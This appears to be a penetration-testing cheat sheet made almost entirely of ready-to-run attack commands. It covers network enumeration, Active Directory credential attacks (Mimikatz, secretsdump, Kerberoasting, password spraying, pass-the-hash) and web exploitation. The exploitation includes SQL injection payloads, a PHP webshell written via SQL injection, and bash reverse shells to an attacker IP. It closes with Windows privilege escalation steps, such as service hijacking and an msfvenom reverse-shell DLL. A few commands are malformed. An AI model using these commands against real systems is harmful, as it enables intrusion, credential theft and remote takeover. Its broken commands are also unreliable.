
## File Transfers
### Netcat
```
#Attacker
nc <target_ip> 1234 < nmap

#Target
nc -lvp 1234 > nmap
```
### Downloading on Windows
```
powershell -command Invoke-WebRequest -Uri http://<LHOST>:<LPORT>/<FILE> -Outfile C:\\temp\\<FILE>
iwr -uri http://lhost/file -Outfile file
certutil -urlcache -split -f "http://<LHOST>/<FILE>" <FILE>
copy \\kali\share\file .
```
### Downloading on Linux
```
wget http://lhost/file
curl http://<LHOST>/<FILE> > <OUTPUT_FILE>
```

## Adding Users
### Windows 

```
net user username password /add
net localgroup Administrators password /add
net localgroup "Remote Desktop Users" username /ADD
```
### Linux
```
adduser <uname> #Interactive
useradd <uname>

useradd -u <UID> -g <group> <uname>  #UID can be something new than existing, this command is to add a user to a specific group
```



## Initial Enumeration
### Nmap
```
nmap -sS -sC -oN initial_scan.txt {IP}  
nmap -sS -p- -oN all_ports.txt {IP}
```
```
Scripts
nmap -p 445 --script ms-sql-info <host>
nmap -p 1433 --script ms-sql-info --script-args mssql.instance-port=1433 <host>
nmap --script smb-enum-users.nse -p445 <host>
sudo nmap -sU -sS --script smb-enum-users.nse -p U:137,T:139 <host>
```
### Gobuster 
```
gobuster dir -u http://url -w /location/wordlist/file.txt  
gobuster vhost -u http://url -w /location/wordlist/file.txt  

/usr/share/seclists/Discovery/Web-Content/common.txt  
/usr/share/seclists/Discovery/Web-Content/big.txt  
/usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt  
```


### Enum4Linux
```
enum4linux -e options http://[ip]
```

### HTTP Request Banner Grabbing
```
Using Netcat
nc <target ip> 80

This will connect to the webserver which will allow you to send a request command

Head / HTTP/1.0

Hit enter twice as all headers have two spaces between them and the request. This should then 
return the Header of the request

```
### SMB 
```
nmap -v -sS -p 445,139 -Pn --script smb-vuln* --script-args=unsafe=1 -oA smb_vuln_scan_192.168.189.42 192.168.189.42  

showmount -e 10.10.10.10  

smbclient -L 10.10.10.10

nmap -Pn -p445 - open - max-hostgroup 3 - smb-vuln-ms17-010 script <ip_netblock>

```
### Redis

```
Redis - 6379
nmap --script redis-info -sV -p 6379 <IP>

To check if the db is able to apply Server side execution run the following, then try to run the file from the browser.
root@Urahara:~# redis-cli -h 10.85.0.52
10.85.0.52:6379> config set dir /usr/share/nginx/html
OK
10.85.0.52:6379> config set dbfilename redis.php
OK
10.85.0.52:6379> set test "<?php phpinfo(); ?>"
OK
10.85.0.52:6379> save
OK

>info 
>get config *

https://book.hacktricks.xyz/pentesting/6379-pentesting-redis
```

### SQL
```
sqlmap -u http://192.168.202.163/login/index.php?id=1 --batch 
--batch bypasses all options when running commands

```

## Enumerating Discovered Ports

### 22 - SSH 
```
nc -vn <IP> 22
  
msf> use scanner/ssh/ssh_enumusers

hydra -L user.txt -P password.txt {IP} 22
```
  
### 21 FTP 
```
Anonymous Login Enabled
ftp {IP}
anonymous - Username
anonymous - Password 
  ls -al 
  
nmap --script ftp-* -p 21 <ip>

Downloads all files in FTP 
wget -m ftp://anonymous:anonymous@10.10.10.10

Connecting in a browser 
ftp://anonymous:anonymous@10.10.10.10
```

### 80/443 HTTP/HTTPS
#### Nikto 
```
nikto -h {URL}
nikto -h {URL} | tee nikto
```

## Subdomains 
### Sublister
```
sublist3r -d url.com
```

## XSS
### Testing if there is a xss vulnerability 
```
<script>alert("testing")</script>

```
```
xsser -u “http://192.168.169.130/xss/example1.php?name=hacker” -p (the_responce_from_the_field_intercepted_in_burp)
xsser -u “http://192.168.169.130/xss/example1.php?name=hacker” –auto –reverse-check -s
xsser -u “http://192.168.169.130/xss/example1.php?name=hacker” –heuristic
xsser –gtk - Launch interface
```

## Active Directory
### Initial Attack vectors
### LLMNR Poisoning
```
python Responder.py -l tun0 -rdw 
hashcat -m 5600 hashes.txt rockyou.txt
```
### SMB Relay
```
gedit Responder.conf
python Responder.py -l tun0 -rdw 
python ntlmrelayx.py -tf targets.txt -smb2support (wait for an event)
```


## Attacking Active Directory
### Password Spraying
```
# Crackmapexec - check if the output shows 'Pwned!'
crackmapexec smb <IP or subnet> -u users.txt -p 'pass' -d <domain> --continue-on-success #use continue-on-success option if it's subnet

# Kerbrute
kerbrute passwordspray -d corp.com .\usernames.txt "pass"
```
### AS-REP Roasting
```
impacket-GetNPUsers -dc-ip <DC-IP> <domain>/<user>:<pass> -request #this gives us the hash of AS-REP Roastable accounts, from kali linux
.\Rubeus.exe asreproast /nowrap #dumping from compromised windows host

hashcat -m 18200 hashes.txt wordlist.txt --force # cracking hashes
```
### Kerberoasting
```
.\Rubeus.exe kerberoast /outfile:hashes.kerberoast #dumping from compromised windows host, and saving with customname

impacket-GetUserSPNs -dc-ip <DC-IP> <domain>/<user>:<pass> -request #from kali machine

hashcat -m 13100 hashes.txt wordlist.txt --force # cracking hashes

```

### Silver Tickets
Obtaining hash of an SPN user using Mimikatz
```
privilege::debug
sekurlsa::logonpasswords #obtain NTLM hash of the SPN account here
```

Obtaining Domain SID
```
ps> whoami /user
# this gives SID of the user that we're logged in as. If the user SID is "S-1-5-21-1987370270-658905905-1781884369-1105" then the domain   SID is "S-1-5-21-1987370270-658905905-1781884369"
```
Fording silver ticket ft Mimikatz
```
kerberos::golden /sid:<domainSID> /domain:<domain-name> /ptt /target:<targetsystem.domain> /service:<service-name> /rc4:<NTLM-hash> /user:<new-user>
exit

# we can check the tickets by,
ps> klist
```

### Secretsdump
```
secretsdump.py <domain>/<user>:<password>@<IP>
secretsdump.py uname@IP -hashes lmhash:ntlmhash #local user
secretsdump.py domain/uname@IP -hashes lmhash:ntlmhash #domain user
```

### Dumping NTDS.dit
```
secretsdump.py <domain>/<user>:<password>@<IP> -just-dc-ntlm
#use -just-dc-ntlm option with any of the secretsdump command to dump ntds.dit
```

## Lateral Movement in Active Directory
### psexec - smbexec - wmiexec - atexec

```
psexec.py <domain>/<user>:<password1>@<IP>
# the user should have write access to Admin share then only we can get sesssion

psexec.py -hashes aad3b435b51404eeaad3b435b51404ee:5fbc3d5fec8206a30f4b6c473d68ae76 <domain>/<user>@<IP> <command> 
#we passed full hash here

smbexec.py <domain>/<user>:<password1>@<IP>

smbexec.py -hashes aad3b435b51404eeaad3b435b51404ee:5fbc3d5fec8206a30f4b6c473d68ae76 <domain>/<user>@<IP> <command> 
#we passed full hash here

wmiexec.py <domain>/<user>:<password1>@<IP>

wmiexec.py -hashes aad3b435b51404eeaad3b435b51404ee:5fbc3d5fec8206a30f4b6c473d68ae76 <domain>/<user>@<IP> <command> 
#we passed full hash here

atexec.py -hashes aad3b435b51404eeaad3b435b51404ee:5fbc3d5fec8206a30f4b6c473d68ae76 <domain>/<user>@<IP> <command>
#we passed full hash here
```



### Post Compromise Enumeration
#### Powerview
```
PowerView Cheat Sheet:  https://gist.github.com/HarmJ0y/184f9822b195c52dd50c379ed3117993!

#### Bloodhound
### Post Compromise Attacks

```
### Impacket
```
smbclient.py [domain]/[user]:[password/password hash]@[Target IP Address] #we connect to the server rather than a share

lookupsid.py [domain]/[user]:[password/password hash]@[Target IP Address] #User enumeration on target

services.py [domain]/[user]:[Password/Password Hash]@[Target IP Address] [Action] #service enumeration

secretsdump.py [domain]/[user]:[password/password hash]@[Target IP Address]  #Dumping hashes on target

GetUserSPNs.py [domain]/[user]:[password/password hash]@[Target IP Address] -dc-ip <IP> -request  #Kerberoasting, and request option dumps TGS

GetNPUsers.py test.local/ -dc-ip <IP> -usersfile usernames.txt -format hashcat -outputfile hashes.txt #Asreproasting, need to provide usernames list

##RCE
psexec.py test.local/john:password123@10.10.10.1
psexec.py -hashes lmhash:nthash test.local/john@10.10.10.1

wmiexec.py test.local/john:password123@10.10.10.1
wmiexec.py -hashes lmhash:nthash test.local/john@10.10.10.1

smbexec.py test.local/john:password123@10.10.10.1
smbexec.py -hashes lmhash:nthash test.local/john@10.10.10.1

atexec.py test.local/john:password123@10.10.10.1 <command>
atexec.py -hashes lmhash:nthash test.local/john@10.10.10.1 <command>
```

### Evil-Winrm
```
##winrm service discovery
nmap -p5985,5986 <IP>
5985 - plaintext protocol
5986 - encrypted

##Login with password
evil-winrm -i <IP> -u user -p pass
evil-winrm -i <IP> -u user -p pass -S #if 5986 port is open

##Login with Hash
evil-winrm -i <IP> -u user -H ntlmhash

##Login with key
evil-winrm -i <IP> -c certificate.pem -k priv-key.pem -S #-c for public key and -k for private key

##Logs
evil-winrm -i <IP> -u user -p pass -l

##File upload and download
upload <file>
download <file> <filepath-kali> #not required to provide path all time

##Loading files direclty from Kali location
evil-winrm -i <IP> -u user -p pass -s /opt/privsc/powershell #Location can be different
Bypass-4MSI
Invoke-Mimikatz.ps1
Invoke-Mimikatz

##evil-winrm commands
menu # to view commands
#There are several commands to run
#This is an example for running a binary
evil-winrm -i <IP> -u user -p pass -e /opt/privsc
Bypass-4MSI
menu
Invoke-Binary /opt/privsc/winPEASx64.exe
```

### Mimikatz
```
privilege::debug

token::elevate

sekurlsa::logonpasswords #hashes and plaintext passwords
lsadump::sam
lsadump::sam SystemBkup.hiv SamBkup.hiv
lsadump::dcsync /user:krbtgt
lsadump::lsa /patch #both these dump SAM

#OneLiner
.\mimikatz.exe "privilege::debug" "sekurlsa::logonpasswords" "exit"
```
### Ligolo-ng
```
#Creating interface and starting it.
sudo ip tuntap add user $(whoami) mode tun ligolo
sudo ip link set ligolo up

#Kali machine - Attacker machine
./proxy -laddr 0.0.0.0:9001 -selfcert

#windows or linux machine - compromised machine
agent.exe -connect <LHOST>:9001 -ignore-cert

#In Ligolo-ng console
session #select host
ifconfig #Notedown the internal network's subnet
start #after adding relevent subnet to ligolo interface

#Adding subnet to ligolo interface - Kali linux
sudo ip r add <subnet> dev ligolo
```

### NFS Enumeration
```
nmap -sV --script=nfs-showmount <IP>
showmount -e <IP>
```

### SNMP Enumeration
```
#Nmap UDP scan
sudo nmap <IP> -A -T4 -p- -sU -v -oN nmap-udpscan.txt

snmpcheck -t <IP> -c public #Better version than snmpwalk as it displays more user friendly

snmpwalk -c public -v1 -t 10 <IP> #Displays entire MIB tree, MIB Means Management Information Base
snmpwalk -c public -v1 <IP> 1.3.6.1.4.1.77.1.2.25 #Windows User enumeration
snmpwalk -c public -v1 <IP> 1.3.6.1.2.1.25.4.2.1.2 #Windows Processes enumeration
snmpwalk -c public -v1 <IP> 1.3.6.1.2.1.25.6.3.1.2 #Installed software enumeraion
snmpwalk -c public -v1 <IP> 1.3.6.1.2.1.6.13.1.3 #Opened TCP Ports

#Windows MIB values
1.3.6.1.2.1.25.1.6.0 - System Processes
1.3.6.1.2.1.25.4.2.1.2 - Running Programs
1.3.6.1.2.1.25.4.2.1.4 - Processes Path
1.3.6.1.2.1.25.2.3.1.4 - Storage Units
1.3.6.1.2.1.25.6.3.1.2 - Software Name
1.3.6.1.4.1.77.1.2.25 - User Accounts
1.3.6.1.2.1.6.13.1.3 - TCP Local Ports
```

## Web Attacks
### Directory Traversal
``` 
cat /etc/passwd #displaying content through absolute path
cat ../../../etc/passwd #relative path

# if the pwd is /var/log/ then in order to view the /etc/passwd it will be like this
cat ../../etc/passwd

#In web int should be exploited like this, find a parameters and test it out
http://mountaindesserts.com/meteor/index.php?page=../../../../../../../../../etc/passwd
#check for id_rsa, id_ecdsa
#If the output is not getting formatted properly then,
curl http://mountaindesserts.com/meteor/index.php?page=../../../../../../../../../etc/passwd 

#For windows
http://192.168.221.193:3000/public/plugins/alertlist/../../../../../../../../Users/install.txt #no need to provide drive
```

### URL Encoding
```
#Sometimes it doesn't show if we try path, then we need to encode them
curl http://192.168.50.16/cgi-bin/%2e%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd
```

### Local File Inclusion
```
#At first we need 
http://192.168.45.125/index.php?page=../../../../../../../../../var/log/apache2/access.log&cmd=whoami #we're passing a command here

#Reverse shells
bash -c "bash -i >& /dev/tcp/192.168.119.3/4444 0>&1"
#We can simply pass a reverse shell to the cmd parameter and obtain reverse-shell
bash%20-c%20%22bash%20-i%20%3E%26%20%2Fdev%2Ftcp%2F192.168.119.3%2F4444%200%3E%261%22 #encoded version of above reverse-shell

#PHP wrapper
curl "http://mountaindesserts.com/meteor/index.php?page=data://text/plain,<?php%20echo%20system('uname%20-a');?>" 
curl http://mountaindesserts.com/meteor/index.php?page=php://filter/convert.base64-encode/resource=/var/www/html/backup.php
```

### SQL Injection
```
admin' or '1'='1
' or '1'='1
" or "1"="1
" or "1"="1"--
" or "1"="1"/*
" or "1"="1"#
" or 1=1
" or 1=1 --
" or 1=1 -
" or 1=1--
" or 1=1/*
" or 1=1#
" or 1=1-
") or "1"="1
") or "1"="1"--
") or "1"="1"/*
") or "1"="1"#
") or ("1"="1
") or ("1"="1"--
") or ("1"="1"/*
") or ("1"="1"#
) or '1`='1-
```

### Blind SQL Injection - This can be identified by Time-based SQLI
```
#Application takes some time to reload, here it is 3 seconds
http://192.168.50.16/blindsqli.php?user=offsec' AND IF (1=1, sleep(3),'false') -- //

```

###
```
kali> impacket-mssqlclient Administrator:Lab123@192.168.50.18 -windows-auth #To login
EXECUTE sp_configure 'show advanced options', 1;
RECONFIGURE;
EXECUTE sp_configure 'xp_cmdshell', 1;
RECONFIGURE;
#Now we can run commands
EXECUTE xp_cmdshell 'whoami';

#Sometimes we may not have direct access to convert it to RCE from the web, then follow the below steps
' UNION SELECT "<?php system($_GET['cmd']);?>", null, null, null, null INTO OUTFILE "/var/www/html/tmp/webshell.php" -- // #Writing into a new file
#Now we can exploit it
http://192.168.45.285/tmp/webshell.php?cmd=id #Command execution
```
### SQLMap - Automated Code Execution
```
sqlmap -u http://192.168.50.19/blindsqli.php?user=1 -p user #Testing on parameter names "user", we'll get confirmation
sqlmap -u http://192.168.50.19/blindsqli.php?user=1 -p user --dump #Dumping database

#OS Shell
#  Obtain the Post request from Burp suite and save it to post.txt
sqlmap -r post.txt -p item  --os-shell  --web-root "/var/www/html/tmp" #/var/www/html/tmp is the writable folder on target, hence we're writing there

```


## Windows Privilege Escalation
### Manual Enumeration commands
```
#Groups we're part of
whoami /groups

whoami /all #lists everything we own.

#Starting, Restarting and Stopping services in Powershell
Start-Service <service>
Stop-Service <service>
Restart-Service <service>

#Powershell History
Get-History
(Get-PSReadlineOption).HistorySavePath #displays the path of consoleHost_history.txt
type C:\Users\sathvik\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt

#Viewing installed execuatbles
Get-ItemProperty "HKLM:\SOFTWARE\Wow6432Node\Microsoft\Windows\CurrentVersion\Uninstall\*" | select displayname
Get-ItemProperty "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall\*" | select displayname

#Process Information
Get-Process
Get-Process | Select ProcessName,Path

#Sensitive info in XAMPP Directory
Get-ChildItem -Path C:\xampp -Include *.txt,*.ini -File -Recurse -ErrorAction SilentlyContinue
Get-ChildItem -Path C:\Users\dave\ -Include *.txt,*.pdf,*.xls,*.xlsx,*.doc,*.docx -File -Recurse -ErrorAction SilentlyContinue #this for a specific user

#Service Information
Get-CimInstance -ClassName win32_service | Select Name,State,PathName | Where-Object {$_.State -like 'Running'}
```
### Automated Scripts
```
winpeas.exe
winpeas.bat
Jaws-enum.ps1
powerup.ps1
PrivescCheck.ps1
```

### Token Impersonation
```
#Printspoofer
PrintSpoofer.exe -i -c powershell.exe 
PrintSpoofer.exe -c "nc.exe <lhost> <lport> -e cmd"

#RoguePotato
RoguePotato.exe -r <AttackerIP> -e "shell.exe" -l 9999

#GodPotato
GodPotato.exe -cmd "cmd /c whoami"
GodPotato.exe -cmd "shell.exe"

#JuicyPotatoNG
JuicyPotatoNG.exe -t * -p "shell.exe" -a

#SharpEfsPotato
SharpEfsPotato.exe -p C:\Windows\system32\WindowsPowerShell\v1.0\powershell.exe -a "whoami | Set-Content C:\temp\w.log"
#writes whoami command to w.log file
```

## Services
### Binary Hijacking
```
#Identify service from winpeas
icalcs "path" #F means full permission, we need to check we have full access on the folder
sc qc <servicename> #find binary path variable
sc config <service> <option>="<value>" #change the path to the reverse shell location
sc start <servicename>
```
### Unquoted Service Path
```
wmic service get name,pathname | findstr /i /v "C:\Windows\\" | findstr /i /v """  #Displays services which has missing quotes, this can slo be obtained by running WinPEAS
#Check the Writable path
icalcs "path"
#Insert the payload in writable location and which works.
sc start <servicename>
```

### Insecure Service Executables
```
#In Winpeas look for a service which has the following
File Permissions: Everyone [AllAccess]
#Replace the executable in the service folder and start the service
sc start <service>
```

### Weak Registry permissions
```
#Look for the following in Winpeas services info output
HKLM\system\currentcontrolset\services\<service> (Interactive [FullControl]) #This means we have full access

accesschk /acceptula -uvwqk <path of registry> #Check for KEY_ALL_ACCESS

#Service Information from regedit, identify the variable that holds the executable
reg query <reg-path>

reg add HKLM\SYSTEM\CurrentControlSet\services\regsvc /v ImagePath /t REG_EXPAND_SZ /d C:\PrivEsc\reverse.exe /f
#Imagepath is the variable here

net start <service>
```
### DLL Hijacking
Find Missing DLLs using Process Monitor, Identify a specific service that looks suspicious, and add a filter.
Check whether you have write permissions in the directory associated with the service.

```
# Create a reverse-shell
msfvenom -p windows/x64/shell_reverse_tcp LHOST=<attaker-IP> LPORT=<listening-port> -f dll > filename.dll
```
Copy it to the victim machine and then move it to the service-associated directory.(Make sure the dll name is similar to the missing name)
Start the listener and restart the service; you'll get a shell.








